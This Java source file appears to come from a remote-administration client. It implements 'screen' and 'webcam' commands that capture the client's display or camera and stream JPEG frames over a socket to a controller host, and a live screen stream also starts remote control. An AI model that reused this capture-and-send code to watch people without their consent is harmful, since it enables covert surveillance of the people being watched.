package br.com.introcdc.connect.client.commands.image;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:28
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientControlComponents;
import br.com.introcdc.connect.client.components.ClientImageComponents;
import br.com.introcdc.connect.client.components.ClientProcessComponents;
import com.github.sarxos.webcam.Webcam;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Objects;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class ClientCommandScreenWebcam extends ClientCommand {

    public ClientCommandScreenWebcam() {
        super("screen", "webcam");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        boolean webcam = command.toLowerCase().equalsIgnoreCase("webcam");
        if (webcam) {
            if (ClientImageComponents.WEBCAM_LIVE) {
                ClientImageComponents.WEBCAM_LIVE = false;
                msg("Transmissão de webcam interrompida!");
                try {
                    Webcam cam = ClientImageComponents.getWebcam(ClientProcessComponents.LAST_ID);
                    if (cam != null && cam.isOpen()) {
                        cam.close();
                    }
                } catch (Exception exception) {
                    exception(exception);
                    msg("Ocorreu um erro ao fechar a webcam! (" + exception.getMessage() + ")");
                }
                try {
                    System.gc();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                    exception(exception);
                }
                return;
            }
        } else {
            if (ClientImageComponents.SCREEN_LIVE) {
                ClientImageComponents.SCREEN_LIVE = false;
                msg("Transmissão de tela interrompida!");
                try {
                    System.gc();
                } catch (Exception exception) {
                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                    exception(exception);
                }
                return;
            }
        }

        if (input.isEmpty()) {
            input = "1";
        }
        try {
            int fps = input.split(" ").length > 1 ? Integer.parseInt(input.split(" ")[1]) : 0;
            if (fps > 60) {
                msg("FPS máximo: 60");
                return;
            }
            int id = Integer.parseInt(input.split(" ")[0]) - 1;
            msg("Inicializando conexão com a " + (webcam ? "webcam" : "tela") + "...");

            new Thread(() -> {
                BufferedImage image = webcam ? ClientImageComponents.getWebcam(id, fps > 0, true) : ClientImageComponents.getImage(id, true);
                if (image == null) {
                    msg(webcam ? "Webcam não encontrada!" : "Monitor não encontrado!");
                    return;
                }
                msg((webcam ? "webcam" : "screen") + "-" + (fps > 0 ? "live" : "image"));
                if (fps > 0) {
                    if (webcam) {
                        ClientImageComponents.WEBCAM_LIVE = true;
                    } else {
                        ClientImageComponents.SCREEN_LIVE = true;
                        new Thread(ClientControlComponents::startControlClient).start();
                    }
                    ScheduledFuture<?> TASK = ConnectClient.EXECUTOR.scheduleAtFixedRate(ConnectClient.runnable(() -> {
                        try {
                            if ((webcam && !ClientImageComponents.WEBCAM_LIVE) || (!webcam && !ClientImageComponents.SCREEN_LIVE)) {
                                msg((ClientImageComponents.LIVE_STOPPER ? "stoplive" + (webcam ? "webcam" : "screen") : "") + "Atualizador da live parado - " + (webcam ? "webcam" : "screen"));
                                try {
                                    System.gc();
                                } catch (Exception exception) {
                                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception.getMessage() + ")");
                                    exception(exception);
                                }
                                if (webcam) {
                                    ClientImageComponents.WEBCAM.cancel(true);
                                } else {
                                    ClientImageComponents.SCREEN.cancel(true);
                                }
                                return;
                            }

                            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT);
                                 OutputStream os = imageSocket.getOutputStream()) {
                                new DataOutputStream(os).writeUTF("SECONDARY:" + ConnectClient.KEY + ":" + (webcam ? "WEBCAM" : "SCREEN"));
                                ImageIO.write(Objects.requireNonNull(webcam ? ClientImageComponents.getWebcam(id, true, true) : ClientImageComponents.getImage(id, true)), "jpg", os);
                            } catch (Exception exception) {
                                if (ClientImageComponents.LIVE_STOPPER) {
                                    if (webcam) {
                                        if (ClientImageComponents.WEBCAM_LIVE) {
                                            ClientImageComponents.WEBCAM_LIVE = false;
                                            Webcam cam = ClientImageComponents.getWebcam(id);
                                            if (cam != null && cam.isOpen()) {
                                                cam.close();
                                            }
                                        }
                                    } else {
                                        if (ClientImageComponents.SCREEN_LIVE) {
                                            ClientImageComponents.SCREEN_LIVE = false;
                                        }
                                    }
                                    msg("stoplive" + (webcam ? "webcam" : "screen") + "Erro ao enviar imagem da transmissão - " + (webcam ? "webcam" : "screen"));
                                    if (webcam) {
                                        ClientImageComponents.WEBCAM.cancel(true);
                                    } else {
                                        ClientImageComponents.SCREEN.cancel(true);
                                    }
                                } else {
                                    msg("Ocorreu um erro ao enviar imagem da transmissão - " + (webcam ? "webcam" : "screen") + " (" + exception.getMessage() + ")");
                                    exception(exception);
                                }
                                try {
                                    System.gc();
                                } catch (Exception exception1) {
                                    msg("Ocorreu um erro ao liberar memória ram do computador! (" + exception1.getMessage() + ")");
                                    exception(exception1);
                                }
                                exception(exception);
                            }
                        } catch (Exception exception) {
                            msg("Ocorreu um erro ao cancelar o atualizador da live de " + (webcam ? "webcam" : "screen") + "! (" + exception.getMessage() + ")");
                            exception(exception);
                        }
                    }), 0, 1000 / fps, TimeUnit.MILLISECONDS);
                    if (webcam) {
                        ClientImageComponents.WEBCAM = TASK;
                    } else {
                        ClientImageComponents.SCREEN = TASK;
                    }
                } else {
                    ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> ClientImageComponents.sendImage(webcam ? 2 : 1, image)), Connect.DELAY, Connect.DELAY_TYPE);
                }
            }).start();
        } catch (Exception ignored) {
            msg("Digite um número válido!");
        }
    }

}
